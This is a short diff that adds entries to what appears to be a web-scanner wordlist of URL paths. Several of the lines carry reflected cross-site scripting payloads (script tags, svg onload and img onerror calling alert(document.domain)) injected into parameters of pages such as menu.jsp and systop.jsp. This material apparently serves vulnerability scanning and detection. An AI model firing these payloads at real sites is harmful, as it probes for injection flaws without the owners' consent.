@@ -975,3 +975,9 @@ request?info=<svg onload=alert(
 /plantuml/uml/SyfFKj2rKt3CoKnELR1Io4ZDoSa70000
 /jobs/?\
 /EZ-NET60/AlertMessages.aspx?Usertext=<img%20src%3Dx%20onerror%3Dalert(document.domain)>
+/read.php?idName=1%3Cscript%3Ealert(document.domain)%3C/script%3E&mudi=getCityData
+/?portgw=80089948;%20alert(document.domain)
+/index.jsp
+/menu.jsp?flag=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/systop.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
